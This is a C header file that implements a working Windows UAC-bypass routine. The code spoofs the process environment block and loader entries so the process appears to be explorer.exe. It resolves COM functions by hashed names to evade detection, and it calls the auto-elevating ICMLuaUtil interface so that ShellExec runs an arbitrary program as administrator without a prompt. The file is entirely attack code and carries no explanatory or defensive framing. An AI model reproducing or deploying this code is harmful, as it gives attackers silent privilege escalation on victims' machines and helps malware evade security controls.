#ifndef CMLUAUTIL_H
#define CMLUAUTIL_H

#include "winapi_loader.h"
#include <unknwn.h>

STRINGW(explorer, "\\explorer.exe")
STRINGW(moniker, "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")

STRINGW(ole32_dll, "ole32.dll")
#define coinitializeex HASH("CoInitializeEx")
#define createbindctx HASH("CreateBindCtx")
#define mkparsedisplayname HASH("MkParseDisplayName")
#define couninitialize HASH("CoUninitialize")

typedef HRESULT (WINAPI *CoInitializeEx_t)(LPVOID, DWORD);
typedef HRESULT (WINAPI *CreateBindCtx_t)(DWORD, IBindCtx**);
typedef HRESULT (WINAPI *MkParseDisplayName_t)(IBindCtx*, LPOLESTR, ULONG*, IMoniker**);
typedef void (WINAPI *CoUninitialize_t)(void);

typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICMLuaUtil* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(ICMLuaUtil* This);
    ULONG(STDMETHODCALLTYPE* Release)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method1)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method2)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method3)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method4)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method5)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method6)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* ShellExec)(ICMLuaUtil* This, LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
} *PICMLuaUtilVtbl;

interface ICMLuaUtil { const struct ICMLuaUtilVtbl* lpVtbl; };

int InvokeComElevation(char* file, char* params, int nShowCmd) {
    WCHAR* windir_val = (WCHAR*)(0x7FFE0000 + 0x30);

    int windir_val_len = 0;
    while (windir_val[windir_val_len] != L'\0') windir_val_len++;

    int explorer_len = 0;
    while (explorer[explorer_len] != L'\0') explorer_len++;

    int chExpl_count = windir_val_len + explorer_len + 1;
    WCHAR chExpl[chExpl_count];

    int len = 0;
    for (int i = 0; i < windir_val_len; i++) {
        chExpl[len++] = windir_val[i];
    }

    for (int j = 0; j < explorer_len; j++) {
        chExpl[len++] = explorer[j];
    }
    chExpl[len] = L'\0'; 

    PPEB peb = (void*)__readgsqword(0x60);

    USHORT pLen = peb->ProcessParameters->ImagePathName.Length / sizeof(WCHAR);
    WCHAR wExe[pLen + 1];
    
    WCHAR* pBuf = peb->ProcessParameters->ImagePathName.Buffer;

    for (int i = 0; i < pLen; i++) {
        wExe[i] = pBuf[i];
    }
    wExe[pLen] = L'\0';

    InitUnicodeString(&peb->ProcessParameters->ImagePathName, chExpl);
    InitUnicodeString(&peb->ProcessParameters->CommandLine, chExpl);

    PLIST_ENTRY pStart = (PLIST_ENTRY)peb->Ldr->Reserved2[1]; 

    PLIST_ENTRY pCurr = pStart;
    do {
        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)pCurr;

        WCHAR* s1 = wExe;
        WCHAR* s2 = pEntry->FullDllName.Buffer;

        if (s2) {
            int i = 0;
            while (s1[i] && s2[i]) {
                WCHAR c1 = (s1[i] | 0x20);
                WCHAR c2 = (s2[i] | 0x20);
                if (c1 != c2) break;
                i++;
            }

            if (s1[i] == L'\0' && s2[i] == L'\0') {
                InitUnicodeString(&pEntry->FullDllName, chExpl);
                UNICODE_STRING* pBase = (UNICODE_STRING*)&pEntry->Reserved4[0];
                InitUnicodeString(pBase, explorer);
            }
        }
        pCurr = pCurr->Flink;
    } while (pCurr && pCurr != pStart);

    HMODULE hOle32 = myLoadLibraryW(ole32_dll);
    CoInitializeEx_t CoInitializeEx = (CoInitializeEx_t)xGetProcAddressH(hOle32, coinitializeex);
    CreateBindCtx_t CreateBindCtx = (CreateBindCtx_t)xGetProcAddressH(hOle32, createbindctx);
    MkParseDisplayName_t MkParseDisplayName = (MkParseDisplayName_t)xGetProcAddressH(hOle32, mkparsedisplayname);
    CoUninitialize_t CoUninitialize = (CoUninitialize_t)xGetProcAddressH(hOle32, couninitialize);

    ICMLuaUtil* CMLuaUtil = NULL;
    
    const IID xIID_ICMLuaUtil =
    {
        0x6EDD6D74,
        0xC007,
        0x4E75,
        { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C }
    };

    BIND_OPTS3 bOpts = {0};
    bOpts.cbStruct = sizeof(bOpts);
    bOpts.dwClassContext = CLSCTX_LOCAL_SERVER;

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	
    IBindCtx* pBindCtx = NULL;
    IMoniker* pMoniker = NULL;
    
    CreateBindCtx(0, &pBindCtx);
    
    pBindCtx->lpVtbl->SetBindOptions(pBindCtx, (BIND_OPTS*)&bOpts);
    
    LPOLESTR szMoniker = moniker;
    
    ULONG eaten = 0;
    
    MkParseDisplayName(pBindCtx, szMoniker, &eaten, &pMoniker);
    
    HRESULT hrObj = pMoniker->lpVtbl->BindToObject(pMoniker, pBindCtx, NULL, &xIID_ICMLuaUtil, (void**)&CMLuaUtil);
    
    pMoniker->lpVtbl->Release(pMoniker);
    pBindCtx->lpVtbl->Release(pBindCtx);
    
    if (FAILED(hrObj))
        return FALSE;
    
    WCHAR wFile[MAX_PATH];
    for (int i = 0; i < MAX_PATH; i++) { wFile[i] = 0; }

    int i = 0;
    while (file[i]) {
        wFile[i] = (WCHAR)file[i];
        i++;
    }
    wFile[i] = L'\0';

    size_t paramsLen = 0;
    
    while (params && params[paramsLen]) {
        paramsLen++;
    }
    
    WCHAR *pArgs = NULL;
    WCHAR wArgs[paramsLen + 1];
    
    if (params) {
        int j = 0;
    
        while (params[j]) {
            wArgs[j] = (WCHAR)params[j];
            j++;
        }
    
        wArgs[j] = L'\0';
        pArgs = wArgs;
    }
    
    HRESULT hrExec = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, wFile, pArgs, NULL, 0, nShowCmd);

    CMLuaUtil->lpVtbl->Release(CMLuaUtil);

    CoUninitialize();

    return (SUCCEEDED(hrExec));
}

#endif // CMLUAUTIL_H
